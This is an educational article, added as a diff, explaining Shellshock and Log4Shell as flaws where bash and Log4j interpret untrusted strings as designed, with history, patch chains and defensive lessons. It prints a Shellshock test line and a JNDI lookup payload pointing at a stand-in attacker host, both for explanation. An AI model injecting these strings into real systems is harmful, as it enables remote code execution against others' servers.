@@ -1,0 +1,93 @@
+---
+slug: the-interpreter-problem
+title: "Shellshock and Log4Shell: when the vulnerability is a feature"
+summary: "Neither was a memory bug. In both cases a widely used component did exactly what its documentation said, to a string that had come from a stranger. One sat undiscovered in bash for about twenty-two years; the other made logging - the single thing every application does with untrusted input - into remote code execution. This is the class of flaw that testing for crashes will never find."
+concepts: ["shellshock", "log4shell", "jndi", "cgi", "environment variables", "injection", "interpreter", "supply chain"]
+relatedTools: []
+relatedArticles: ["the-named-tls-attacks", "there-is-no-perfect-code", "memory-safety", "the-worm-era"]
+category: security
+order: 126
+status: reviewed
+updated: "2026-09-08"
+---
+
+The tooling built to find this class before it ships - static analysis of the code, dynamic testing of the running system - has its own history in the **[SAST and DAST lineage](/learn/sast-dast-family-history)**, including why neither reliably catches the join.
+
+## The shape
+
+Most of the vulnerabilities in this catalogue are mistakes: a buffer overrun, a missing check, a state machine that accepts a message twice. This article is about a different and more uncomfortable class, where nothing is broken. A component receives a string, interprets it as it was designed to, and the interpretation is code execution - because the string came from someone the designer never imagined.
+
+Two of them are the canonical examples, seven years apart, and they are worth reading together because the shape is identical.
+
+## Shellshock, 2014
+
+Bash has a feature for passing shell functions to child processes: it encodes them in environment variables, and a child bash reads the variable and defines the function. Reasonable, documented, used.
+
+The defect was that bash did not stop at the end of the function definition. Anything written after it was parsed and executed too. Written out, the entire vulnerability fits on one line:
+
+```bash
+env='() { :;}; echo VULNERABLE' bash -c ':'
+```
+
+The first part is a valid, empty function. The semicolon ends it. Everything after runs.
+
+On its own that would be a curiosity, because setting an environment variable usually requires already being on the machine. What made it a catastrophe is the other end. **Web servers running CGI (Common Gateway Interface) scripts pass HTTP request headers to the program as environment variables.** The `User-Agent` a browser sends becomes an environment variable, and if the program is a shell script, bash reads it. A remote, unauthenticated attacker could therefore run commands on a web server by choosing what to put in a header. The same mechanism reached OpenSSH's forced-command feature, DHCP clients, and mail servers.
+
+Stéphane Chazelas reported it to bash's maintainer on 12 September 2014, and it was published on the 24th as CVE-2014-6271 once fixes were ready. Analysis of the source suggested the behaviour had been in bash since around 1992. **Twenty-two years**, in one of the most widely deployed programs in existence, in code that thousands of people had read.
+
+Five further CVE identifiers followed within days, because the first fix was incomplete.
+
+## Log4Shell, 2021
+
+Log4j is the logging library most Java applications use. Somewhere in its history it acquired a substitution feature: certain patterns inside a logged string are looked up and replaced. One of the supported lookups was JNDI (Java Naming and Directory Interface) - which can fetch an object from a remote directory service - an LDAP (Lightweight Directory Access Protocol) server, typically - and, having fetched it, load it.
+
+So an attacker sends a string:
+
+```text
+${jndi:ldap://attacker.example/a}
+```
+
+and needs only for a vulnerable application to **log it**. Not process it, not trust it, not validate it - log it. The library sees the pattern, contacts the attacker's server, downloads a Java class and runs it.
+
+The reason this was the worst-rated vulnerability in years is what applications log. A rejected login. A malformed request. A `User-Agent` header. A username that failed validation. The one thing every application does with input it does not trust is write it to a log, on the assumption that recording something is inert. It is not; and a great deal of software logs untrusted input specifically because it looked suspicious.
+
+Chen Zhaojun of the Alibaba Cloud Security Team reported it to the Apache Software Foundation on 24 November 2021; it was patched and public on 9 December, scored the maximum 10.0, and was being exploited immediately. The Foundation's own wording is precise: in versions up to 2.14.1, JNDI features used in configuration, log messages and parameters did not protect against attacker-controlled endpoints, and an attacker who could control log messages could execute code loaded from a remote server.
+
+And then the patch chain, which is a lesson in itself. Version 2.15.0 only partially fixed it. 2.16.0 fixed what 2.15.0 missed and disabled the lookup by default, but introduced a denial-of-service flaw. It took until 2.17.1 to settle. **Anyone who patched once and moved on was still exposed** - the same pattern the [Ivanti follow-on advisories](/learn/the-ssl-vpn-is-being-dismantled) show, where a second and third flaw indicated the vendor did not yet understand its own attack surface.
+
+## Why this class is different
+
+**Fuzzing does not find it.** The standard way to hunt for memory-safety bugs is to throw malformed input at a program and watch for a crash. Neither of these crashes. Bash parses the variable successfully. Log4j resolves the lookup successfully. The software behaves correctly, and correct behaviour is the exploit. The [memory-safety article](/learn/memory-safety) describes the class of bug that automated tooling is good at; this is the class it is blind to.
+
+**Code review does not reliably find it either**, because each half is defensible in isolation. Exporting functions through the environment is a feature. Substituting values into log messages is a feature. Passing HTTP headers to CGI programs as environment variables is a specification. The vulnerability exists only in the join, and the join is usually across a boundary nobody owns - between the shell and the web server, between the application and the library it logs with.
+
+**And it is a supply-chain problem by construction.** Almost nobody who was exposed to Log4Shell had heard of the lookup feature, because almost nobody chose Log4j directly; it arrived as a dependency of a dependency. The question "do we use Log4j" turned out, for most organisations, to be genuinely hard to answer in December 2021, and that difficulty is the reason software bills of materials stopped being a compliance exercise and started being an operational one.
+
+## The recurring theme
+
+This catalogue keeps arriving at the same place from different directions. [Melissa](/learn/the-worm-era) exploited no vulnerability at all: Word macros running automatically and Outlook being scriptable were both features. [Mirai](/learn/mirai-and-the-default-password) exploited no vulnerability: it logged in with factory credentials. Shellshock and Log4Shell are the same observation applied to libraries rather than products.
+
+The uncomfortable conclusion is that **the most damaging failures are frequently not bugs**, and therefore not reachable by the activities that find bugs. They are the consequences of a capability meeting an input it was never scoped for, and the defence is not better code but narrower capability: features off by default, interpretation disabled unless asked for, and a clear answer to the question of what, exactly, is allowed to interpret a string that came from outside.
+
+## What a practitioner should take from it
+
+The formats where two implementations can disagree about the same bytes are collected in **[the formats in between](/learn/the-formats-in-between)**.
+
+**Know what interprets.** For any component handling external input, ask what it does with the *content* rather than the size. A logger, a templating engine, a filename, a configuration parser and a search query are all interpreters, and each is a candidate for this failure.
+
+**Treat logging as an attack surface.** It is the least suspected data path in most systems and it touches the most untrusted data. Anything that expands, resolves or renders a logged value is a risk, and structured logging that stores values rather than interpolating them removes most of the danger.
+
+**Assume the first patch is not the last.** Both of these needed several. When an advisory is this severe, the correct plan includes re-checking the version a week later.
+
+**And keep the dependency question answerable in advance.** The organisations that handled December 2021 well were not the ones with better security products; they were the ones that could produce, in an afternoon, a list of every application containing a given library. That is an inventory problem, and it is solvable before the emergency rather than during it.
+
+## Sources
+
+- [Wikipedia, Shellshock: a family of security bugs in GNU Bash, the first disclosed on 24 September 2014; Stéphane Chazelas informed Bash's maintainer Chet Ramey on 12 September of the original bug, which he called Bashdoor, and worked with security experts on a patch; assigned CVE-2014-6271, with CVE-2014-6277, 6278, 7169, 7186 and 7187 following; affected Bash 1.0.3 to 4.3](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
+- [On the mechanism and timeline: the vulnerability lies in Bash executing commands when receiving non-standard values of environment variables; it remained under embargo until 14:00 UTC on 24 September to give distribution maintainers time; analysis of the source indicates it was introduced around version 1.13 in 1992 or earlier and remained undetected since](https://github.com/demining/shellshock-attack)
+- [A worked demonstration of the parsing flaw: Bash exports functions as environment variables and continues parsing after the function definition, so a value such as `() { :;}; echo PWNED` executes the second command; web servers using CGI pass HTTP headers as environment variables to Bash, making a `User-Agent` header an attack vector](https://github.com/mtaha-sec/bash-apocalypse)
+- [CVE-2014-6271, as described by CISA: GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, allowing remote attackers to execute code, demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in Apache, and scripts executed by DHCP clients](https://www.cvedetails.com/cve/CVE-2014-6271/)
+- [Red Hat's advisory: certain services and applications allow remote unauthenticated attackers to provide environment variables, allowing them to exploit the issue; Red Hat became aware that the patch for CVE-2014-6271 was incomplete, and malware exploiting the vulnerability circulated within days](https://access.redhat.com/security/vulnerabilities/shellshock)
+- [Wikipedia, Log4Shell: CVE-2021-44228, discovered 24 November 2021 by Chen Zhaojun of the Alibaba Cloud Security Team, patched 9 December 2021, affecting applications that log user input using Log4j 2](https://en.wikipedia.org/wiki/Log4Shell)
+- [Help Net Security, December 2021: reported to the Apache Software Foundation by Chen Zhaojun and fixed in 2.15.0; CVSS 10.0; in versions 2.14.1 and earlier, JNDI features used in configuration, log messages and parameters do not protect against attacker-controlled LDAP and other JNDI endpoints, and an attacker who can control log messages or their parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled](https://www.helpnetsecurity.com/2021/12/10/cve-2021-44228/)
+- [Huntress: attackers crafted a string such as `${jndi:ldap://attacker.com/a}` and got it logged by a vulnerable application, at which point Log4j interpreted the lookup, connected to the attacker-controlled LDAP server and downloaded and executed a Java class; because applications log all sorts of user-provided data such as User-Agent headers and form submissions, the exploit was frighteningly simple; patching to 2.15.0 was insufficient, 2.16.0 fixed CVE-2021-45046 and disabled JNDI by default but introduced CVE-2021-45105, and 2.17.1 was required](https://www.huntress.com/threat-library/vulnerabilities/cve-2021-44228)
